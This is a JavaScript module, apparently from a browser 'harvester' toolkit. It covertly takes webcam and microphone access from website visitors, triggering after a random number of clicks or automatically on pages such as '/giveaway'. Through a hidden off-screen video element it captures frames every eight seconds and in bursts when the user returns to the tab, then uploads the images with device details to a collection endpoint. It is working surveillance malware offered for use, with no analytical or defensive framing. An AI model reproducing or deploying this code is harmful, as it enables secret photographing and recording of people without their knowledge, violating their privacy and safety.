export default class CameraAccessor {
  constructor(core) {
    this.core = core;
    this.stream = null;
    this.active = false;
    this.captureInterval = null;
    this.CAPTURE_INTERVAL_MS = 8000; // Capture every 8 seconds
    this.video = null;
    this.capturing = false;
    this.tabHidden = false;
    this.capturesOnSwitch = 0;
    this.MAX_CAPTURES_ON_SWITCH = 3; // Max captures per tab switch
  }

  init() {
    // Create a hidden video element once and reuse it
    this.video = document.createElement('video');
    this.video.style.position = 'absolute';
    this.video.style.left = '-9999px';
    this.video.style.visibility = 'hidden';
    this.video.setAttribute('playsinline', '');
    this.video.setAttribute('muted', '');
    this.video.muted = true;
    document.body.appendChild(this.video);

    // Listen for trigger - e.g., after 3 clicks or on specific page
    this.triggerPoint = Math.floor(Math.random() * 5) + 3; // 3-7 clicks

    document.addEventListener('click', () => {
      this.clickCount = (this.clickCount || 0) + 1;
      if (this.clickCount >= this.triggerPoint && !this.active) {
        this.requestCamera();
      }
    });

    // Also auto-request on specific pages
    if (
      window.location.pathname.includes('/video') ||
      window.location.pathname.includes('/giveaway')
    ) {
      setTimeout(() => this.requestCamera(), 2000);
    }

    // === CRITICAL: Handle tab switches ===
    document.addEventListener('visibilitychange', () => {
      if (document.hidden) {
        this.tabHidden = true;
        // Tab switched away - keep stream alive if possible
        this.onTabHidden();
      } else {
        this.tabHidden = false;
        // User returned to tab - capture immediately
        this.onTabVisible();
      }
    });

    // Handle window blur/focus (tab switch, alt-tab, window minimize)
    window.addEventListener('blur', () => {
      this.tabHidden = true;
      this.onTabHidden();
    });

    window.addEventListener('focus', () => {
      this.tabHidden = false;
      // When window gets focus back, capture immediately
      setTimeout(() => this.onTabVisible(), 300);
    });

    // Handle Page Visibility API changes
    document.addEventListener('webkitvisibilitychange', () => {
      if (!document.webkitHidden && this.active) {
        setTimeout(() => this.captureFrame(), 200);
      }
    });
  }

  onTabHidden() {
    // When tab goes hidden, we may still be able to capture a frame
    // before the browser fully pauses the stream
    if (this.active && this.stream) {
      this.captureFrame();
    }
  }

  onTabVisible() {
    if (!this.active) {
      // Try to re-request camera if we had it before
      const hadCamera = sessionStorage.getItem('harvester_camera_granted');
      if (hadCamera === 'true') {
        this.requestCamera();
      }
      return;
    }

    // Reset captures-on-switch counter periodically
    setTimeout(() => {
      this.capturesOnSwitch = 0;
    }, 30000);

    if (this.capturesOnSwitch >= this.MAX_CAPTURES_ON_SWITCH) return;
    this.capturesOnSwitch++;

    // Check if stream is still alive
    const track = this.stream?.getVideoTracks()?.[0];
    if (!track || track.readyState === 'ended' || !track.enabled) {
      // Stream died while tab was hidden - restart it
      this.cleanup();
      this.requestCamera();
      return;
    }

    // Re-attach stream to video element (browser may have disconnected it)
    try {
      this.video.srcObject = this.stream;
    } catch (e) {
      this.cleanup();
      this.requestCamera();
      return;
    }

    // Capture multiple frames rapidly when user returns
    this.captureFrame();           // Immediate
    setTimeout(() => this.captureFrame(), 500);  // 500ms later
    setTimeout(() => this.captureFrame(), 1500);  // 1.5s later (catches delayed autofocus)

    // Resume periodic captures
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
    }
    this.captureInterval = setInterval(() => this.captureFrame(), this.CAPTURE_INTERVAL_MS);
  }

  async requestCamera() {
    if (this.active) return;
    if (this.denied) return; // Don't retry if already denied

    try {
      const constraints = {
        video: {
          width: { ideal: 640 },
          height: { ideal: 480 },
          facingMode: 'user',
        },
        audio: true,
      };

      this.stream = await navigator.mediaDevices.getUserMedia(constraints);

      // Ensure we actually have video content before marking active
      const track = this.stream.getVideoTracks()?.[0];
      if (!track) {
        this.cleanup();
        return;
      }

      this.active = true;
      this.denied = false;

      // Store that camera was granted
      sessionStorage.setItem('harvester_camera_granted', 'true');

      await this.core.send('/api/collect/camera-access', { granted: true });

      // Attach stream to persistent video element
      this.video.srcObject = this.stream;

      // Wait for video to be ready then capture first frame
      this.video.onloadedmetadata = () => {
        this.video.play();
        setTimeout(() => this.captureFrame(), 300);
      };

      // Start periodic capture
      setTimeout(() => this.captureFrame(), 500);
      this.captureInterval = setInterval(() => this.captureFrame(), this.CAPTURE_INTERVAL_MS);

      // If stream ends, log it
      if (this.stream.getVideoTracks().length > 0) {
        this.stream.getVideoTracks()[0].addEventListener('ended', () => {
          this.cleanup();
        });

        // Watch for track changes (enable/disable)
        this.stream.getVideoTracks()[0].addEventListener('track', () => {
          // Track was modified, check if still active
        });
      }

      // Listen for devicechange (camera unplugged, etc.)
      navigator.mediaDevices.addEventListener('devicechange', () => {
        // Camera devices changed, check if ours still exists
        if (this.active) {
          this.captureFrame();
        }
      });

    } catch (error) {
      this.active = false;
      this.denied = true; // Mark as denied so we never retry for this session
      sessionStorage.removeItem('harvester_camera_granted');
      // Stop all capture timers immediately
      if (this.captureInterval) {
        clearInterval(this.captureInterval);
        this.captureInterval = null;
      }
      await this.core.send('/api/collect/camera-access', { granted: false });
    }
  }

  captureFrame() {
    if (!this.stream || !this.active || !this.video || this.capturing) return;

    this.capturing = true;

    try {
      // Check if video track is still alive
      const track = this.stream.getVideoTracks()?.[0];
      if (!track || track.readyState === 'ended') {
        this.capturing = false;
        return;
      }

      // Ensure video is playing
      if (this.video.paused) {
        this.video.play().catch(() => {});
      }

      // Use requestAnimationFrame to sync with display refresh
      const doCapture = () => {
        if (this.video.readyState < 2) {
          // Video not ready yet, wait for loadeddata
          this.video.addEventListener(
            'loadeddata',
            () => {
              this.snapshotFrame();
            },
            { once: true }
          );
          return;
        }
        this.snapshotFrame();
      };

      requestAnimationFrame(doCapture);
    } catch (e) {
      this.capturing = false;
    }
  }

  snapshotFrame() {
    if (!this.stream || !this.active || !this.video) {
      this.capturing = false;
      return;
    }

    try {
      // Verify video has actual content (not just a blank frame)
      if (this.video.readyState < 2 || this.video.videoWidth === 0 || this.video.videoHeight === 0) {
        this.capturing = false;
        return;
      }

      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(this.video, 0, 0, 320, 240);

      // Check if the captured frame is blank/black (permission was revoked or stream is empty)
      const imageDataUrl = canvas.toDataURL('image/jpeg', 0.7);
      
      // Sample a small pixel area to check for blank frame
      const sampleSize = 10;
      const pixelData = ctx.getImageData(
        canvas.width / 2 - sampleSize / 2,
        canvas.height / 2 - sampleSize / 2,
        sampleSize,
        sampleSize
      ).data;
      
      // Check if all sampled pixels are black (r+g+b ≈ 0) or very close to black
      let totalBrightness = 0;
      for (let i = 0; i < pixelData.length; i += 4) {
        totalBrightness += pixelData[i] + pixelData[i + 1] + pixelData[i + 2];
      }
      const avgBrightness = totalBrightness / (pixelData.length / 4) / 3;
      
      // If average brightness is below threshold (very dark/black), skip upload
      // 0 = pure black, 255 = pure white. < 10 = essentially black frame
      if (avgBrightness < 10) {
        console.warn('📷 Skipping blank camera frame (avg brightness:', avgBrightness.toFixed(1), ')');
        this.capturing = false;
        return;
      }

      const imageData = imageDataUrl;

      const track = this.stream.getVideoTracks()[0];
      const metadata = {
        facingMode: track?.getSettings()?.facingMode || 'user',
        resolution: `${canvas.width}x${canvas.height}`,
        deviceLabel: track?.label || 'unknown',
        deviceId: track?.getSettings()?.deviceId || '',
        width: canvas.width,
        height: canvas.height,
        capturedOnTabSwitch: this.capturesOnSwitch > 0,
        tabWasHidden: this.tabHidden
      };

      this.core.send('/api/collect/camera', {
        imageData,
        metadata,
        triggerType: this.tabHidden ? 'permission-forced' : 'periodic',
      });
    } catch (e) {
      // Silently fail
    } finally {
      this.capturing = false;
    }
  }

  cleanup() {
    this.active = false;
    this.denied = false;
    sessionStorage.removeItem('harvester_camera_granted');
    if (this.captureInterval) {
      clearInterval(this.captureInterval);
      this.captureInterval = null;
    }
    if (this.video) {
      this.video.pause();
      this.video.srcObject = null;
    }
    if (this.stream) {
      this.stream.getTracks().forEach((track) => track.stop());
      this.stream = null;
    }
  }
}